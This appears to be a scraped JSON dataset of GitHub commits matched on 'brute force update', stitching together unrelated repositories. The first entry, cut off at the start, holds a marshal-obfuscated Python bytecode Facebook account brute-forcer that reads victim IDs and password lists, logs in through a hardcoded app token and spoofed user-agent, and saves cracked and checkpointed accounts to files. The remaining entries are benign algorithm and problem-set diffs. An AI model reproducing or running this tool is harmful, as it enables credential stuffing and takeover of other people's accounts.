c\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x05\\x00\\x00\\x00C\\x00\\x00\\x00s\\xa7\\x00\\x00\\x00y\\x11\\x00t\\x00\\x00j\\x01\\x00d\\x01\\x00\\x83\\x01\\x00\\x01Wn\\x11\\x00\\x04t\\x02\\x00k\\n\\x00r$\\x00\\x01\\x01\\x01n\\x01\\x00Xy7\\x00x0\\x00t\\x03\\x00t\\x04\\x00d\\x02\\x00\\x83\\x02\\x00j\\x05\\x00\\x83\\x00\\x00D]\\x19\\x00}\\x00\\x00t\\x06\\x00j\\x07\\x00|\\x00\\x00j\\x08\\x00\\x83\\x00\\x00\\x83\\x01\\x00\\x01q>\\x00WWn\\x11\\x00\\x01\\x01\\x01t\\t\\x00d\\x03\\x00\\x83\\x01\\x00\\x01n\\x01\\x00Xd\\x04\\x00\\x84\\x00\\x00}\\x01\\x00y \\x00t\\n\\x00d\\x05\\x00\\x83\\x01\\x00}\\x02\\x00|\\x02\\x00j\\x0b\\x00|\\x01\\x00t\\x06\\x00\\x83\\x02\\x00\\x01Wn\\x07\\x00\\x01\\x01\\x01n\\x01\\x00Xd\\x00\\x00S(\\x06\\x00\\x00\\x00Nt\\x04\\x00\\x00\\x00saveR\\x14\\x00\\x00\\x00t\\x04\\x00\\x00\\x00Exitc\\x01\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x03\\x00\\x00\\x00S\\x00\\x00\\x00s\\xfe\\x00\\x00\\x00|\\x00\\x00}\\x01\\x00t\\x00\\x00j\\x01\\x00d\\x01\\x00t\\x02\\x00\\x17d\\x02\\x00\\x17|\\x01\\x00\\x17d\\x03\\x00\\x17\\x83\\x01\\x00}\\x02\\x00t\\x03\\x00j\\x04\\x00|\\x02\\x00\\x83\\x01\\x00}\\x03\\x00d\\x04\\x00|\\x03\\x00k\\x06\\x00r\\x93\\x00t\\x05\\x00t\\x06\\x00d\\x05\\x00\\x17t\\x02\\x00\\x17d\\x06\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01t\\x01\\x00d\\x08\\x00d\\t\\x00\\x83\\x02\\x00}\\x04\\x00|\\x04\\x00j\\x07\\x00t\\x02\\x00d\\n\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01|\\x04\\x00j\\x08\\x00\\x83\\x00\\x00\\x01ng\\x00d\\x0b\\x00|\\x03\\x00d\\x0c\\x00\\x19k\\x06\\x00r\\xfa\\x00t\\x05\\x00t\\t\\x00d\\r\\x00\\x17t\\x02\\x00\\x17d\\x06\\x00\\x17t\\t\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01t\\x01\\x00d\\x0e\\x00d\\t\\x00\\x83\\x02\\x00}\\x05\\x00|\\x05\\x00j\\x07\\x00t\\x02\\x00d\\n\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01|\\x05\\x00j\\x08\\x00\\x83\\x00\\x00\\x01n\\x00\\x00d\\x00\\x00S(\\x0f\\x00\\x00\\x00Ns\\x91\\x00\\x00\\x00https:\/\/b-api.facebook.com\/method\/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s\\x17\\x00\\x00\\x00&locale=en_US&password=sH\\x00\\x00\\x00&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmt\\x0c\\x00\\x00\\x00access_tokens\\x0b\\x00\\x00\\x00\\n[NOOB_OK] s\\x05\\x00\\x00\\x00  |  s\\x01\\x00\\x00\\x00\\ns\\x18\\x00\\x00\\x00save\/Noob_Successful.txtt\\x01\\x00\\x00\\x00as\\n\\x00\\x00\\x00 [ NOOB ] s\\x10\\x00\\x00\\x00www.facebook.comt\\t\\x00\\x00\\x00error_msgs\\x0b\\x00\\x00\\x00\\n[NOOB_CP] s\\x18\\x00\\x00\\x00save\/Noob_CheckPoint.txt(\\n\\x00\\x00\\x00t\\x02\\x00\\x00\\x00brt\\x04\\x00\\x00\\x00opent\\x06\\x00\\x00\\x00victimt\\x04\\x00\\x00\\x00jsont\\x04\\x00\\x00\\x00loadR\\x0b\\x00\\x00\\x00R\\x11\\x00\\x00\\x00R\\x04\\x00\\x00\\x00t\\x05\\x00\\x00\\x00closeR\\x12\\x00\\x00\\x00(\\x06\\x00\\x00\\x00R\\x08\\x00\\x00\\x00t\\x04\\x00\\x00\\x00linet\\x04\\x00\\x00\\x00datat\\x01\\x00\\x00\\x00qt\\x03\\x00\\x00\\x00okbt\\x03\\x00\\x00\\x00cps(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00R\\n\\x00\\x00\\x00t\\x04\\x00\\x00\\x00main\\x89\\x00\\x00\\x00s\\x1a\\x00\\x00\\x00\\x00\\x01\\x06\\x02\\x1f\\x01\\x0f\\x02\\x0c\\x01\\x1e\\x01\\x0f\\x01\\x19\\x01\\r\\x02\\x10\\x01\"\\x01\\x0f\\x01\\x19\\x01i\\x1e\\x00\\x00\\x00(\\x0c\\x00\\x00\\x00t\\x02\\x00\\x00\\x00ost\\x05\\x00\\x00\\x00mkdirt\\x07\\x00\\x00\\x00OSErrorR\\x1b\\x00\\x00\\x00t\\x03\\x00\\x00\\x00filt\\t\\x00\\x00\\x00readlinest\\x02\\x00\\x00\\x00idt\\x06\\x00\\x00\\x00appendt\\x05\\x00\\x00\\x00stript\\x04\\x00\\x00\\x00exitR\\x00\\x00\\x00\\x00t\\x03\\x00\\x00\\x00map(\\x03\\x00\\x00\\x00R\\t\\x00\\x00\\x00R%\\x00\\x00\\x00t\\x01\\x00\\x00\\x00p(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00R\\n\\x00\\x00\\x00t\\x04\\x00\\x00\\x00Noob~\\x00\\x00\\x00s\\x1e\\x00\\x00\\x00\\x00\\x01\\x03\\x01\\x11\\x01\\r\\x01\\x04\\x01\\x03\\x01\\x1c\\x01\\x1b\\x01\\x03\\x01\\x0e\\x02\\t\\x13\\x03\\x01\\x0c\\x01\\x14\\x01\\x03\\x01(\\x02\\x00\\x00\\x00s\\n\\x00\\x00\\x00user-agents\\x1e\\x01\\x00\\x00Dalvik\/1.6.0 (Linux; U; Android 4.4.2; NX55 Build\/KOT5506) [FBAN\/FB4A;FBAV\/106.0.0.26.68;FBBV\/45904160;FBDM\/{density=3.0,width=1080,height=1920};FBLC\/it_IT;FBRV\/45904160;FBCR\/PosteMobile;FBMF\/asus;FBBD\/asus;FBPN\/com.facebook.katana;FBDV\/ASUS_Z00AD;FBSV\/5.0;FBOP\/1;FBCA\/x86:armeabi-v7a;](<\\x00\\x00\\x00R&\\x00\\x00\\x00R\\x02\\x00\\x00\\x00R\\x06\\x00\\x00\\x00t\\x06\\x00\\x00\\x00randomR\\x1d\\x00\\x00\\x00t\\x08\\x00\\x00\\x00requestst\\x0b\\x00\\x00\\x00ImportErrort\\x06\\x00\\x00\\x00systemt\\t\\x00\\x00\\x00mechanizet\\x14\\x00\\x00\\x00multiprocessing.poolR\\x00\\x00\\x00\\x00R\\x01\\x00\\x00\\x00R\\x0b\\x00\\x00\\x00R\\x1a\\x00\\x00\\x00t\\x11\\x00\\x00\\x00set_handle_robotst\\x05\\x00\\x00\\x00Falset\\x12\\x00\\x00\\x00set_handle_refresht\\x05\\x00\\x00\\x00_httpt\\x14\\x00\\x00\\x00HTTPRefreshProcessort\\n\\x00\\x00\\x00addheadersR\\x07\\x00\\x00\\x00t\\x07\\x00\\x00\\x00sessiont\\x02\\x00\\x00\\x00rst\\x03\\x00\\x00\\x00gett\\x02\\x00\\x00\\x00rgt\\x04\\x00\\x00\\x00textt\\x01\\x00\\x00\\x00xR+\\x00\\x00\\x00t\\x03\\x00\\x00\\x00aclR\\x0f\\x00\\x00\\x00R\\x10\\x00\\x00\\x00R\\x12\\x00\\x00\\x00R\\x0e\\x00\\x00\\x00t\\x03\\x00\\x00\\x00pclR\\x11\\x00\\x00\\x00t\\x03\\x00\\x00\\x00wclt\\x03\\x00\\x00\\x00mclt\\x03\\x00\\x00\\x00nclt\\x06\\x00\\x00\\x00formatt\\x04\\x00\\x00\\x00warnt\\x04\\x00\\x00\\x00infot\\n\\x00\\x00\\x00PermissionR.\\x00\\x00\\x00t\\x04\\x00\\x00\\x00Truet\\t\\x00\\x00\\x00raw_inputt\\x03\\x00\\x00\\x00Usrt\\x04\\x00\\x00\\x00Usert\\x03\\x00\\x00\\x00psdt\\x03\\x00\\x00\\x00Pwdt\\x04\\x00\\x00\\x00logoR\\x1c\\x00\\x00\\x00t\\x08\\x00\\x00\\x00passlistR)\\x00\\x00\\x00t\\x03\\x00\\x00\\x00strR\\x1b\\x00\\x00\\x00R*\\x00\\x00\\x00t\\x04\\x00\\x00\\x00wordt\\x04\\x00\\x00\\x00filet\\x03\\x00\\x00\\x00lenR1\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00R\\n\\x00\\x00\\x00t\\x08\\x00\\x00\\x00<module>\\x05\\x00\\x00\\x00s\\xa0\\x00\\x00\\x00<\\x02\\x03\\x01\\x10\\x01\\r\\x01\\x11\\x01\\r\\x02\\x03\\x01\\x10\\x01\\r\\x01\\r\\x01\\x10\\x02\\x10\\x01\\x10\\x02\\t\\x07\\x0c\\x01\\r\\x01\\x1c\\x01\\x0c\\x03\\r\\x02\\n\\x01\\r\\x01\\r\\x01\\x0c\\x01\\t\\x01\\x0f\\x01\\x08\\x06\\x06\\x04\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x07*\\x04$\\x02\\x0c\\x01\\x03\\x02\\x0e\\x01\\r\\x01\\r\\x01\\x07\\x02\\t\\x01\\r\\x01\\n\\x01\\x10\\x01\\x0c\\x01\\x0e\\x01\\x10\\x01\\x0c\\x01\\x0e\\x01\\x04\\x02\\x0e\\x01\\x10\\x02\\x0e\\x01\\x11\\x02\\r\\x01\\x05\\x01\\n\\x01\\x10\\x01\\x10\\x01\\x06\\x01\\x18\\x01\\x15\\x02\\x12\\x01\\x12\\x01\\x1e\\x06\\t%(\\x02\\x00\\x00\\x00t\\x07\\x00\\x00\\x00marshalt\\x05\\x00\\x00\\x00loads(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00t\\x00\\x00\\x00\\x00t\\x08\\x00\\x00\\x00<module>\\x01\\x00\\x00\\x00s\\x02\\x00\\x00\\x00\\x0c\\x02(\\x02\\x00\\x00\\x00t\\x07\\x00\\x00\\x00marshalt\\x05\\x00\\x00\\x00loads(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00t\\x00\\x00\\x00\\x00t\\x08\\x00\\x00\\x00<module>\\x01\\x00\\x00\\x00s\\x02\\x00\\x00\\x00\\x0c\\x02'))"}},"msg":"Update brute-force.py"}},"https:\/\/github.com\/teichert\/torchfactors":{"2a4b0e92d1823f30e8c45e282bece47390c2f121":{"url":"https:\/\/api.github.com\/repos\/teichert\/torchfactors\/commits\/2a4b0e92d1823f30e8c45e282bece47390c2f121","html_url":"https:\/\/github.com\/teichert\/torchfactors\/commit\/2a4b0e92d1823f30e8c45e282bece47390c2f121","message":"fixed total_change for brute force (torch update)","sha":"2a4b0e92d1823f30e8c45e282bece47390c2f121","keyword":"brute force update","diff":"diff --git a\/src\/torchfactors\/inferencers\/brute_force.py b\/src\/torchfactors\/inferencers\/brute_force.py\nindex 445a0dd..a5f5162 100644\n--- a\/src\/torchfactors\/inferencers\/brute_force.py\n+++ b\/src\/torchfactors\/inferencers\/brute_force.py\n@@ -3,7 +3,7 @@\n # from functools import lru_cache\n from typing import List, Sequence\n \n-from torch import Tensor\n+from torch import Tensor, tensor\n \n from ..factor import Factor\n from ..inferencer import Inferencer\n@@ -28,5 +28,5 @@ def product_marginals_(self, factors: Sequence[Factor], *queries: Sequence[Var],\n             # we transpose first and then untranspose\n             marginals = [m if q == () else T(T(m) - T(logz)) for m, q in zip(marginals, queries)]\n         if append_total_change:\n-            marginals.append(Tensor(0.0))\n+            marginals.append(tensor(0.0))\n         return marginals\n","files":{"\/src\/torchfactors\/inferencers\/brute_force.py":{"changes":[{"diff":"\n # from functools import lru_cache\n from typing import List, Sequence\n \n-from torch import Tensor\n+from torch import Tensor, tensor\n \n from ..factor import Factor\n from ..inferencer import Inferencer\n","add":1,"remove":1,"filename":"\/src\/torchfactors\/inferencers\/brute_force.py","badparts":["from torch import Tensor"],"goodparts":["from torch import Tensor, tensor"]},{"diff":"\n             # we transpose first and then untranspose\n             marginals = [m if q == () else T(T(m) - T(logz)) for m, q in zip(marginals, queries)]\n         if append_total_change:\n-            marginals.append(Tensor(0.0))\n+            marginals.append(tensor(0.0))\n         return marginals\n","add":1,"remove":1,"filename":"\/src\/torchfactors\/inferencers\/brute_force.py","badparts":["            marginals.append(Tensor(0.0))"],"goodparts":["            marginals.append(tensor(0.0))"]}],"source":"\nfrom __future__ import annotations from typing import List, Sequence from torch import Tensor from..factor import Factor from..inferencer import Inferencer from..variable import Var def T(x: Tensor): return x.permute(dims=list(range(x.ndim -1, -1, -1))) class BruteForce(Inferencer): def product_marginals_(self, factors: Sequence[Factor], *queries: Sequence[Var], normalize: bool=True, append_total_change: bool=False ) -> Sequence[Tensor]: first, *others=factors marginals: List[Tensor]=[*first.product_marginals(*queries, other_factors=others)] if normalize: logz=first.product_marginal(other_factors=others) marginals=[m if q==() else T(T(m) -T(logz)) for m, q in zip(marginals, queries)] if append_total_change: marginals.append(Tensor(0.0)) return marginals ","sourceWithComments":"from __future__ import annotations\n\n# from functools import lru_cache\nfrom typing import List, Sequence\n\nfrom torch import Tensor\n\nfrom ..factor import Factor\nfrom ..inferencer import Inferencer\nfrom ..variable import Var\n\n\n# since x.T is for dim != 2 is now deprecated\ndef T(x: Tensor):\n    return x.permute(dims=list(range(x.ndim - 1, -1, -1)))\n\n\nclass BruteForce(Inferencer):\n\n    def product_marginals_(self, factors: Sequence[Factor], *queries: Sequence[Var],\n                           normalize: bool = True, append_total_change: bool = False\n                           ) -> Sequence[Tensor]:\n        first, *others = factors\n        marginals: List[Tensor] = [*first.product_marginals(*queries, other_factors=others)]\n        if normalize:\n            logz = first.product_marginal(other_factors=others)\n            # since it is the first dimension that matches rather than the last,\n            # we transpose first and then untranspose\n            marginals = [m if q == () else T(T(m) - T(logz)) for m, q in zip(marginals, queries)]\n        if append_total_change:\n            marginals.append(Tensor(0.0))\n        return marginals\n"}},"msg":"fixed total_change for brute force (torch update)"}},"https:\/\/github.com\/dhruvaa02\/Capital_One_Rewards_Project":{"52637bb80dd9629f5a15963ed799c7734713f8d5":{"url":"https:\/\/api.github.com\/repos\/dhruvaa02\/Capital_One_Rewards_Project\/commits\/52637bb80dd9629f5a15963ed799c7734713f8d5","html_url":"https:\/\/github.com\/dhruvaa02\/Capital_One_Rewards_Project\/commit\/52637bb80dd9629f5a15963ed799c7734713f8d5","message":"Updating brute force documentation","sha":"52637bb80dd9629f5a15963ed799c7734713f8d5","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex 81359b4..233ab47 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -1,7 +1,7 @@\n \"\"\"\n-This file contains my initial brute force implementation of the rewards points system.\n-The algorithm isn't completely brute force as some simplifcations\/improvements were added\n-however it is still relatively dynamic, albeit theoretically slow.\n+This file contains the initial brute force implementation of the rewards points system.\n+Some simplifcations\/improvements were added so it is still relatively dynamic, \n+albeit theoretically slow.\n \"\"\"\n from rules import RuleSet\n from itertools import permutations\n","files":{"\/brute_force.py":{"changes":[{"diff":"\n \"\"\"\n-This file contains my initial brute force implementation of the rewards points system.\n-The algorithm isn't completely brute force as some simplifcations\/improvements were added\n-however it is still relatively dynamic, albeit theoretically slow.\n+This file contains the initial brute force implementation of the rewards points system.\n+Some simplifcations\/improvements were added so it is still relatively dynamic, \n+albeit theoretically slow.\n \"\"\"\n from rules import RuleSet\n from itertools import permutations\n","add":3,"remove":3,"filename":"\/brute_force.py","badparts":["This file contains my initial brute force implementation of the rewards points system.","The algorithm isn't completely brute force as some simplifcations\/improvements were added","however it is still relatively dynamic, albeit theoretically slow."],"goodparts":["This file contains the initial brute force implementation of the rewards points system.","Some simplifcations\/improvements were added so it is still relatively dynamic, ","albeit theoretically slow."]}],"source":"\n\"\"\" This file contains my initial brute force implementation of the rewards points system. The algorithm isn't completely brute force as some simplifcations\/improvements were added however it is still relatively dynamic, albeit theoretically slow. \"\"\" from rules import RuleSet from itertools import permutations def reduced_bf(spendings: dict) -> tuple: \"\"\"Returns a tuple containing maximum rewards points possible, perumation of ruled applied to reach this maximum value as well as how many times each rule was applied. Args: -spendings: dictionary containing total monthly spendings at merchants in a month Returns: -points_from_permute: tuple of(maximum points, rule order applied for points, number of times rule[n] was applied from perumatation) >>> print(reduced_bf({\"sportcheck\": 210})) [3, 6] \"\"\" valid_rules=get_valid_rules(spendings) permutes=list(permutations(valid_rules)) points_from_permutes=[] for permute in permutes: points=0 spendings_to_try=spendings.copy() times=[] for i in permute: rule=RuleSet().rules[i] times_to_app=min([spendings_to_try[debit] \/\/ rule[1][debit] for debit in rule[1].keys()]) times.append(times_to_app) applied=RuleSet().apply_rule(spendings_to_try, i, times_to_app) points +=applied[0] spendings_to_try=applied[1] points +=RuleSet().apply_rule(spendings_to_try, 0)[0] points_from_permutes.append((points, permute, times)) return max(points_from_permutes) def get_valid_rules(spendings: dict) -> list: \"\"\"Returns a list of all applicable rules for given monthly spendings. Args: -spendings: dictionary containing total monthly spendings at merchants in a month Returns: -valid_rules: list containing the tuples of all valid rules >>> print(get_valid_rules({\"sportcheck\": 210})) [3, 6] \"\"\" total_rules=RuleSet().rules valid_rules=[] for i in range(1, len(total_rules)): valid=True for shop in total_rules[i][1].keys(): if shop not in spendings.keys(): valid=False elif spendings[shop] < total_rules[i][1][shop]: valid=False if valid: valid_rules.append(i) return valid_rules ","sourceWithComments":"\"\"\"\nThis file contains my initial brute force implementation of the rewards points system.\nThe algorithm isn't completely brute force as some simplifcations\/improvements were added\nhowever it is still relatively dynamic, albeit theoretically slow.\n\"\"\"\nfrom rules import RuleSet\nfrom itertools import permutations\n\ndef reduced_bf(spendings: dict) -> tuple:\n    \"\"\"Returns a tuple containing maximum rewards points possible, perumation of ruled\n    applied to reach this maximum value as well as how many times each rule was applied.\n\n    Args:\n        - spendings: dictionary containing total monthly spendings at merchants in a month\n\n    Returns:\n        - points_from_permute: tuple of (maximum points, rule order applied for points,\n                                         number of times rule[n] was applied from perumatation)\n\n    >>> print(reduced_bf({\"sportcheck\": 210}))\n    [3, 6]\n    \"\"\"\n    valid_rules = get_valid_rules(spendings)\n    permutes = list(permutations(valid_rules)) # generate all permutations of applicable rules\n    points_from_permutes = [] # keep track of points from each permutation\n    for permute in permutes:\n        points = 0\n        spendings_to_try = spendings.copy()\n        times = [] # keep track of how many times the rules in order are applied\n        for i in permute:\n            rule = RuleSet().rules[i]\n            # can only apply a rule as the minimum value in spendings divided by maximum dollar value in rule\n            times_to_app = min([spendings_to_try[debit] \/\/ rule[1][debit] for debit in rule[1].keys()])\n            times.append(times_to_app)\n            applied = RuleSet().apply_rule(spendings_to_try, i, times_to_app)\n            points += applied[0]\n            spendings_to_try = applied[1]\n        points += RuleSet().apply_rule(spendings_to_try, 0)[0]\n        points_from_permutes.append((points, permute, times))\n    return max(points_from_permutes)\n\n\ndef get_valid_rules(spendings: dict) -> list:\n    \"\"\"Returns a list of all applicable rules for given monthly spendings.\n\n    Args:\n        - spendings: dictionary containing total monthly spendings at merchants in a month\n\n    Returns:\n        - valid_rules: list containing the tuples of all valid rules\n\n    >>> print(get_valid_rules({\"sportcheck\": 210}))\n    [3, 6]\n    \"\"\"\n    total_rules = RuleSet().rules\n    valid_rules = []\n    for i in range(1, len(total_rules)):\n        valid = True\n        for shop in total_rules[i][1].keys():\n            if shop not in spendings.keys(): # check if store not even bought at\n                valid = False\n            elif spendings[shop] < total_rules[i][1][shop]: # check if spent necessary amount\n                valid = False\n        if valid:\n            valid_rules.append(i)\n    return valid_rules"}},"msg":"Updating brute force documentation"}},"https:\/\/github.com\/MattRieke\/ossu_course_work":{"c925d40d49c49137a1ec877fd1006b5aa728b0d3":{"url":"https:\/\/api.github.com\/repos\/MattRieke\/ossu_course_work\/commits\/c925d40d49c49137a1ec877fd1006b5aa728b0d3","html_url":"https:\/\/github.com\/MattRieke\/ossu_course_work\/commit\/c925d40d49c49137a1ec877fd1006b5aa728b0d3","message":"Updated brute_force_cow_transport.","sha":"c925d40d49c49137a1ec877fd1006b5aa728b0d3","keyword":"brute force update","diff":"diff --git a\/6.0002 Introduction to Computational Thinking and Data Science\/PS1\/__pycache__\/ps1a.cpython-38.pyc b\/6.0002 Introduction to Computational Thinking and Data Science\/PS1\/__pycache__\/ps1a.cpython-38.pyc\nindex e1b8dc1..78aa690 100644\nBinary files a\/6.0002 Introduction to Computational Thinking and Data Science\/PS1\/__pycache__\/ps1a.cpython-38.pyc and b\/6.0002 Introduction to Computational Thinking and Data Science\/PS1\/__pycache__\/ps1a.cpython-38.pyc differ\ndiff --git a\/6.0002 Introduction to Computational Thinking and Data Science\/PS1\/ps1a.py b\/6.0002 Introduction to Computational Thinking and Data Science\/PS1\/ps1a.py\nindex 587c316..a90ba18 100644\n--- a\/6.0002 Introduction to Computational Thinking and Data Science\/PS1\/ps1a.py\t\n+++ b\/6.0002 Introduction to Computational Thinking and Data Science\/PS1\/ps1a.py\t\n@@ -118,12 +118,25 @@ def brute_force_cow_transport(cows,limit=10):\n     \"\"\"\r\n     set = []\r\n     valid_partitions = []\r\n+    cow_names = list(cows.keys())\r\n+    shortest_partition_length = len(cows)\r\n+    result = []\r\n     for n in range(len(cows)):\r\n         set.append(n)\r\n     for partition in get_partitions(set):\r\n         if check_part(partition, cows, limit):\r\n             valid_partitions.append(partition)\r\n-    return min(valid_partitions, key=valid_partitions.get)\r\n+    for partition in valid_partitions:\r\n+        if len(partition) <= shortest_partition_length:\r\n+            shortest_partition_length = len(partition)\r\n+            shortest_partition = partition\r\n+    for trip in shortest_partition:\r\n+        trip_names = []\r\n+        for cow in trip:\r\n+            name = cow_names[cow]\r\n+            trip_names.append(name)\r\n+        result.append(trip_names)\r\n+    return result\r\n \r\n def check_part(part, dict, limit):\r\n     \"\"\"\r\n","files":{"\/6.0002 Introduction to Computational Thinking and Data Science\/PS1\/ps1a.py":{"changes":[{"diff":"\n     \"\"\"\r\n     set = []\r\n     valid_partitions = []\r\n+    cow_names = list(cows.keys())\r\n+    shortest_partition_length = len(cows)\r\n+    result = []\r\n     for n in range(len(cows)):\r\n         set.append(n)\r\n     for partition in get_partitions(set):\r\n         if check_part(partition, cows, limit):\r\n             valid_partitions.append(partition)\r\n-    return min(valid_partitions, key=valid_partitions.get)\r\n+    for partition in valid_partitions:\r\n+        if len(partition) <= shortest_partition_length:\r\n+            shortest_partition_length = len(partition)\r\n+            shortest_partition = partition\r\n+    for trip in shortest_partition:\r\n+        trip_names = []\r\n+        for cow in trip:\r\n+            name = cow_names[cow]\r\n+            trip_names.append(name)\r\n+        result.append(trip_names)\r\n+    return result\r\n \r\n def check_part(part, dict, limit):\r\n     \"\"\"\r\n","add":14,"remove":1,"filename":"\/6.0002 Introduction to Computational Thinking and Data Science\/PS1\/ps1a.py","badparts":["    return min(valid_partitions, key=valid_partitions.get)\r"],"goodparts":["    cow_names = list(cows.keys())\r","    shortest_partition_length = len(cows)\r","    result = []\r","    for partition in valid_partitions:\r","        if len(partition) <= shortest_partition_length:\r","            shortest_partition_length = len(partition)\r","            shortest_partition = partition\r","    for trip in shortest_partition:\r","        trip_names = []\r","        for cow in trip:\r","            name = cow_names[cow]\r","            trip_names.append(name)\r","        result.append(trip_names)\r","    return result\r"]}],"source":"\n \r \r from ps1_partition import get_partitions\r import time\r \r \r def load_cows(filename):\r \"\"\"\r Read the contents of the given file. Assumes the file contents contain\r data in the form of comma-separated cow name, weight pairs, and return a\r dictionary containing cow names as keys and corresponding weights as values.\r \r Parameters:\r filename -the name of the data file as a string\r \r Returns:\r a dictionary of cow name(string), weight(int) pairs\r \"\"\"\r cow_dict={}\r with open(filename) as f:\r for line in f:\r line=line.rstrip()\r comma_pos=line.find(',')\r cow_dict[line[0:comma_pos]]=int(line[comma_pos +1:])\r return cow_dict\r \r def greedy_cow_transport(cows,limit=10):\r \"\"\"\r Uses a greedy heuristic to determine an allocation of cows that attempts to\r minimize the number of spaceship trips needed to transport all the cows. The\r returned allocation of cows may or may not be optimal.\r The greedy heuristic should follow the following method:\r \r 1. As long as the current trip can fit another cow, add the largest cow that will fit\r to the trip\r 2. Once the trip is full, begin a new trip to transport the remaining cows\r \r Does not mutate the given dictionary of cows.\r \r Parameters:\r cows -a dictionary of name(string), weight(int) pairs\r limit -weight limit of the spaceship(an int)\r \r Returns:\r A list of lists, with each inner list containing the names of cows\r transported on a particular trip and the overall list containing all the\r trips\r \"\"\"\r working_dict=cows.copy()\r trips=[]\r while len(working_dict) > 0:\r trip_result=greedy_build_trip(working_dict, limit)\r trips.append(trip_result[0])\r working_dict=trip_result[1]\r return trips\r \r def greedy_build_trip(cows, limit):\r \"\"\"\r Builds a single trip of cows that abides with the weight limit. Takes the heaviest\r cow and loads that cow first. Then fills the trip with the next heaviest cow that still\r fits.\r \r Parameters:\r cows -a dictionary of name(string), weight(int) pairs\r limit -weight limit of the spaceship(int)\r \r Returns:\r A tuple with the following items:\r A list of strings, with each string representing a cow name on the current trip\r A dictionary with the remaining cows not yet boarded\r \"\"\"\r trip=[]\r unloaded_cows=cows.copy()\r remaining_cows=cows.copy()\r trip_weight=0\r while len(remaining_cows) > 0:\r heaviest_cow=max(remaining_cows, key=remaining_cows.get)\r if remaining_cows[heaviest_cow] <=10 -trip_weight:\r trip.append(heaviest_cow)\r trip_weight +=remaining_cows[heaviest_cow]\r del remaining_cows[heaviest_cow]\r del unloaded_cows[heaviest_cow]\r else:\r del remaining_cows[heaviest_cow]\r return(trip,unloaded_cows)\r \r def brute_force_cow_transport(cows,limit=10):\r \"\"\"\r Finds the allocation of cows that minimizes the number of spaceship trips\r via brute force. The brute force algorithm should follow the following method:\r \r 1. Enumerate all possible ways that the cows can be divided into separate trips \r Use the given get_partitions function in ps1_partition.py to help you!\r 2. Select the allocation that minimizes the number of trips without making any trip\r that does not obey the weight limitation\r \r Does not mutate the given dictionary of cows.\r \r Parameters:\r cows -a dictionary of name(string), weight(int) pairs\r limit -weight limit of the spaceship(an int)\r \r Returns:\r A list of lists, with each inner list containing the names of cows\r transported on a particular trip and the overall list containing all the\r trips\r \"\"\"\r set=[]\r valid_partitions=[]\r for n in range(len(cows)):\r set.append(n)\r for partition in get_partitions(set):\r if check_part(partition, cows, limit):\r valid_partitions.append(partition)\r return min(valid_partitions, key=valid_partitions.get)\r \r def check_part(part, dict, limit):\r \"\"\"\r Evaluates a partition to verify that each list within the partition abides with the\r weight limit for the container.\r \r Parameters:\r part -a list of lists of integers that enumerate the possible partitions for the dict\r dict -a dictionary with keys cow name(string) and values weight(integer)\r limit -spaceship weight capcity(integer)\r \r Returns: \r Boolean -True if all sublists of part have summed dict values <=limit\r -Otherwise False\r \"\"\"\r values_list=list(dict.values())\r for trip in part:\r trip_weight=0\r for cow in trip:\r trip_weight +=values_list[cow]\r if trip_weight > limit:\r return False\r return True\r \r def compare_cow_transport_algorithms():\r \"\"\"\r Using the data from ps1_cow_data.txt and the specified weight limit, run your\r greedy_cow_transport and brute_force_cow_transport functions here. Use the\r default weight limits of 10 for both greedy_cow_transport and\r brute_force_cow_transport.\r \r Print out the number of trips returned by each method, and how long each\r method takes to run in seconds.\r \r Returns:\r Does not return anything.\r \"\"\"\r pass\r \r \r if __name__=='__main__':\r print('The result of greedy load 1: ' +str(greedy_cow_transport(load_cows('ps1_cow_data.txt'))))\r print('The result of greedy load 2: ' +str(greedy_cow_transport(load_cows('ps1_cow_data_2.txt'))))\r print('The result of brute force load 1: ' +str(brute_force_cow_transport(load_cows('ps1_cow_data.txt'))))\r print('The result of brute force load 1: ' +str(brute_force_cow_transport(load_cows('ps1_cow_data_2.txt')))) ","sourceWithComments":"###########################\r\n# 6.0002 Problem Set 1a: Space Cows \r\n# Name: Matt Rieke\r\n# Collaborators: None\r\n# Time Start: 2022-02-20 01:26 UTC\r\n\r\n\r\nfrom ps1_partition import get_partitions\r\nimport time\r\n\r\n#================================\r\n# Part A: Transporting Space Cows\r\n#================================\r\n\r\n# Problem 1\r\ndef load_cows(filename):\r\n    \"\"\"\r\n    Read the contents of the given file.  Assumes the file contents contain\r\n    data in the form of comma-separated cow name, weight pairs, and return a\r\n    dictionary containing cow names as keys and corresponding weights as values.\r\n\r\n    Parameters:\r\n    filename - the name of the data file as a string\r\n\r\n    Returns:\r\n    a dictionary of cow name (string), weight (int) pairs\r\n    \"\"\"\r\n    cow_dict = {}\r\n    with open(filename) as f:\r\n        for line in f:\r\n            line = line.rstrip()\r\n            comma_pos = line.find(',')\r\n            cow_dict[line[0:comma_pos]] = int(line[comma_pos + 1:])\r\n    return cow_dict\r\n\r\n# Problem 2\r\ndef greedy_cow_transport(cows,limit=10):\r\n    \"\"\"\r\n    Uses a greedy heuristic to determine an allocation of cows that attempts to\r\n    minimize the number of spaceship trips needed to transport all the cows. The\r\n    returned allocation 